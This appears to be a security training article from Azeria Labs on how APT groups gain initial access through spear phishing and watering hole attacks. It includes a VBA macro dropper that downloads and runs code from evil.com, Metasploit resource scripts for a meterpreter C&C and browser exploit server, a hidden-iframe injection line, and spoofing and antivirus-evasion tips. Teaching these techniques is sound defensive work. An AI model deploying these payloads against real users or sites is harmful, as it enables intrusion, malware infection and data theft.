title = "Initial Compromise |  Azeria Labs"
full_description = '''Initial Compromise In order to gain initial foothold within the target infrastructure APTs drop a malicious program during the point of entry step. While there are multiple ways of deploying malicious payloads the most common cases are malicious email attachments or exploits against the user’s web browser which are embedded into the websites the victim is usually browsing or is forced to browse to [1]. The approach the APTs choose to use depends on the resources they possess or time that is available for carrying out the attack. One of the most common approaches to deliver malicious payload is by attaching it to a spear phishing email. Depending on the sophistication of APT actors, the attachment might be as simple as macros in a Microsoft office documents or a zero day in a specific software. Another common approach of planting malware is attacking user’s web browser through malicious web sites. In this scenario, a website which the user is usually visiting is compromised and the exploit is embedded. Additionally, an arbitrary web site can be hijacked or created just for this purpose. However, the user is then tricked into visiting this site, mostly via spear phishing email which contains a link. In any case, the exploit tries to exploit a known or Zero-Day vulnerability which then results into malicious code being planted on the target’s computer. Finally, while other approaches of delivering the malware exist, the end result is the same – attackers gain control of the victim’s machine. It’s worth mentioning, that the malware delivery process might be complex in a way that multiple stages of malicious code are executed. This is mainly done due to specifics of the malicious payload delivery or in order to bypass security defenses which might detect the initial compromise. Social Engineering Social Engineering is a broad topic with an overwhelming amount of research released. The science of social engineering is deeply rooted in humans’ psychology and evolution, involving concepts of pathology, genetics, philosophy etc. However, this section focuses only on digital communication, more specifically, Spear-Phishing and Watering Hole attacks as these cases are the most common in APT attacks. Many of the social engineering tactics focus on understanding, building trust and manipulating individuals based on their assumptions. An understanding of what the target considers as legitimate or trustworthy allows the threat actor to plan accordingly and choose a story that is consistent with these assumptions, thus fraudulently manipulate the thoughts of the target [2]. Phishing describes a technique which is used to psychologically manipulate the user to reveal personally identifiable information and/or network access credentials by opening a malicious file attached to a specially crafted e-mail, clicking a malicious link or just replying to an e-mail with the requested information, exposing sensitive data to a presumably trusted entity. These e-mails are being sent to several hundreds or thousands of people, either randomly selected, or gathered from illegally obtained e-mail lists which can be bought in underground forums. Spear phishing is another widely used term described as targeted phishing in which only a few or just a single e-mail is sent. These targeted phishing attempts aim to trick a small number of carefully selected users. However, spear phishing can also target a large group of selected individuals instead of just a few. This approach is called mass spear phishing. APT actors rarely perform mass spear phishing and rather aim for a carefully selected list of targets. Due to the success rate of the spear phishing, APT actors don’t need to increase their success rate by targeting a huge number of victims. Moreover, sending e-mails from the same IP address or with the same subject to a large group of people within the same company increases the likelihood of being detected on the (receiving) mail server and therefore poses a risk for the entire operation to fail. For this reason, a stealth and narrow approach by focusing on few carefully selected targets is preferred by APT actors who aim to reach their goal with a lower chance of detection. The currently described stage in the APT attack chain takes place after proper reconnaissance on the target individual and target organization has been conducted. The reason why the compromise in most APT attacks starts with spear phishing is the advantages of this method compared with others. Apart from the fact that it is not difficult to find the e-mail address of a victim in a short amount of time, the spear phishing method itself does not require advanced techniques and is easy to perform, as described later in this section. Hiding the IP address of the machine sending the mails is initially the only factor the attacker has to take care of. This can be done by using proxies, public Wi-Fi, sending mails from a compromised network and other methods. To avoid suspicion, APT actors often use a technique called typo-squatting by simply creating an email address just for this purpose and choose a domain name similar to the one they want to impersonate. This can be done by either making small changes in the domain name, like “xzcompany.com” to “xzconpany.com” or just by using the original name as the username on a free email provider: info.xzcompany.com@gmail.com. Although the last example seems to be easily detectable, a security unaware user might not raise any suspicions. Spear Phishing Techniques In most cases initial compromise is performed by approaching a carefully pre-selected victim via a digital communication channel, such as social networks or e-mail. The later one is known to be the most common method used by APT groups. In this case, the victim receives an e-mail with a malicious attachment or a link to a website where, for example, a browser exploit is delivered. Upon a successful exploitation the computer of the victim is infected with initial malware, such as Remote Administration Tool (RAT) of sorts, which allows threat actors to conduct further attacks against the target’s infrastructure. In the following example a spear phishing email is combined with a Microsoft Word document carrying a malicious Macros code. For this purpose, an Out-Word.ps1 script from Nishang framework is used in order to infect an existing Microsoft Word file. The following commands import the Out-Word.ps1 script and infect Word documents located in the location specified by the WordFileDir: PS C:\> . .\Out-Word.ps1 PS C:\> Out-Word -PayloadURL https://evil.com:80/exploit -WordFileDir C:\evil Once the malicious file is created, it is attached to a personalized e-mail which is crafted in such a way that the victim is tricked into opening the attachment. Usually, the sender address is spoofed and content of the mail is referencing to details which were gathered during the reconnaissance phase. An example shown in Figure 1 illustrates an attempt to impersonate a colleague who is most likely in the team of the targeted victim. Financial or political topics are commonly used in order to make the e-mail more tempting which leads to opening the attachment. Figure 1: Attacker crafts a Spear Phishing e-mail Depending on the exploit type, additional interaction after opening the file might be needed. In case of a Word Macros attack social engineering techniques are used within the content of the Word document in order to bypass restrictions as shown in Figure 2. Figure 2: Social engineering used to trick the user into enabling Macros If the victim clicks on the “Enable Content” the following VBA code embedded by the Out-Word.ps1 script gets executed. Sub Execute() Dim payload payload = "powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring('https://evil.com:80/exploit');" Call Shell(payload, vbHide) End Sub Sub Document_Open() Execute End Sub The purpose of this payload, also known as dropper, is to download additional malicious code from the attacker’s server. Using SSL is a common technique as it allows attackers to hide malicious download from network inspection appliances. It is also necessary to make sure that communication happens through any existing corporate firewalls as it’s usually the only way out from the network. Therefore, the provided PowerShell dropper attempts to pre-select the configuration of the system’s proxy and use it for communications. Once the remote host is contacted it returns additional PowerShell code which is executed within the context of the initial process. Further payloads are injected directly into the memory which allows to bypass Anti-Virus solutions because they usually fail to detect this kind of behavior and mainly rely on monitoring file-system changes. Finally, the usage of native tools, such as PowerShell, makes it difficult to detect anomalies as this tool is commonly used by system administrators to manage IT infrastructure and therefore, such an activity blends in and can be used to hide tracks of malicious actions. On the attacker’s side, the Metasploit framework can be used in order to mimic Command and Control (C&C) server which delivers the malware. The following resource script can be used to automatically configure attacker’s server for intercepting dropper’s communication and delivering additional malware. use exploit/multi/script/web_delivery set SRVHOST <attacker’s ip> set SRVPORT 80 set SSL true set URIPATH exploit set TARGET 2 set PAYLOAD windows/meterpreter/reverse_winhttps set LHOST <attacker’s ip> set LPORT 443 exploit -j –z The commands listed above are saved into a resource file (spear_phishing.res) and used to launch the Metasploit’s console as shown below. $ msfconsole –r spear_phishing.res Configuration of the C&C server is using same techniques as described before: using system’s proxy, common web ports and SSL encryption. These features make the traffic generated by the malware look ordinary and therefore allows attackers to remain undetected. In cases when the target organization performs Deep Packet Inspection which involves breaking SSL on the perimeter, APT groups might use additional techniques to get out from the compromised networks. Most common techniques are the usage of additional encryption of the data which is being transmitted or the usage of covert channels, such as ICMP and DNS tunneling. When all the stages of the dropper are completed, attacker gains remote access via the meterpreter’s command line interface. Figure 3 shows a successful connection and basic command execution. Figure 3: Control channel established Watering Hole Techniques In case of a watering hole attack, APT actors try to figure out which site is frequently visited by their targets and what IP ranges they use. Then a vulnerability on the chosen website is found and exploited in order to inject malicious code into the website. This malicious website contains an iframe or a link which redirects a victim to another website where an exploit code, targeting a vulnerability in the victim’s web browser, is deployed. If the exploit succeeds, attacker’s malware is installed on the computer of the victim. However, this approach would usually result into infecting other individuals rather than the ones actually targeted. One way to avoid this is to filter the individuals by their IPs and launch the attack only against the victims within the IP range used by the target company. In order to illustrate this scenario, Metasploit’s Browser Autopwn module will be used. Despite the fact that this is a loud and unsophisticated way to exploit a browser, it is a good starting point to understand the possibilities. The following resource script prepares a server which delivers exploits against known vulnerabilities in Microsoft’s Internet Explorer web browser. In order to simulate a targeted audience, the module is instructed to serve exploits only to an IP address specified by the “AllowedAddresses” parameter. use auxiliary/server/browser_autopwn2 set SRVHOST 192.168.114.157 set URIPATH /test set LHOST 192.168.114.157 set include_pattern ms1 set AllowedAddresses 192.168.114.160 exploit –j -z The commands listed above are saved into a resource file (watering_hole.res) and used to launch the Metasploit’s console as shown below. $ msfconsole –r watering_hole.res Once the Browser Autopwn module is started the list of pre-loaded exploits is shown along with an URL which is further used in the watering hole attack (see Figure 5). Figure 5: Browser Autopwn server started To infect the website which targeted people are likely to visit it is sufficient to inject the following HTML code. <iframe height="0" width="0" src="http://192.168.114.157:8080/test" style="visibility:hidden;display:none"></iframe> When a targeted user accesses the compromised website attacker’s exploit server fingerprints the user’s browser in order to determine the best match. Then the best exploit is automatically selected and returned to the user via the hidden iframe. In this way the exploitation is invisible for the victim and in the case of success grants the attacker remote access as shown in Figure 6. Figure 6: Victim’s browser exploited during the Watering hole attack While the presented example relies on known vulnerabilities and public exploits, in a real world attack APT groups put a lot of effort to obtain Zero-Day Exploits either by developing on their own or buying from the underground market. Moreover, additional techniques are usually implemented in order to bypass security measures, such as Anti-Virus products, Firewalls, software for mitigating unknown vulnerabilities, etc. Finally, Watering hole attacks can be used in combination with spear phishing to make the e-mail appear more trusted by using a link to a known, but infected website. This approach increases the chance that the victim is willing to click on the link to a site he/she visits regularly for business-related tasks. Additionally, infections of Watering hole websites may be limited to a specific time frame in order to lower the chance of detection. Real World Example: APT28 / Sofacy The group APT28 mostly relies on Spear-Phishing attacks. During these attacks a specially crafted phishing e-mail is sent with either a malicious attachment or a link to a malicious website. The malicious attachment is usually a Microsoft Office document carrying multistage malware. The links, included in the e-mail, are supposed to lead the victim to infected websites serving a custom exploit-kit, which has been known to deliver Zero-Day browser exploits through iframes. Additionally, some of the links lead to a log-in page of a fake web-mail service hosted on a typo-squatted domain. In some cases of a Spear-Phishing attack, AP'''
